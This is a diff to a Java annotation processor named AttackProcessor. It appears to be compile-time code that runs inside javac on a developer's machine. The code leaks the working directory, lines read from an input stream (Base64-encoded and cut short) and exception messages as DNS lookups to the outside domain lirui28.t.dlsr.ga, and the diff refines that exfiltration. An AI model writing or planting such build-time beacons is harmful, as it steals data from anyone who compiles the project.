@@ -31,7 +31,7 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac10.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac11.lirui28.t.dlsr.ga" );
 
             Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
 
@@ -60,12 +60,13 @@ public class AttackProcessor extends AbstractProcessor {
                 String s;
                 while ((s=bw.readLine())!=null) {
 
-                    Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
 
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
 
                     s = s.substring( 0,10 );
                     Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
+
+
                 }
             } catch (Exception e) {
                 Inet4Address.getByName( "runtimeerror"+".lirui28.t.dlsr.ga" );
@@ -78,7 +79,7 @@ public class AttackProcessor extends AbstractProcessor {
             try
             {
 
-                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ).substring( 0,5 )+".lirui28.t.dlsr.ga" );
+                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ).substring( 0,10 )+".lirui28.t.dlsr.ga" );
             }
             catch ( UnknownHostException e1 )
             {
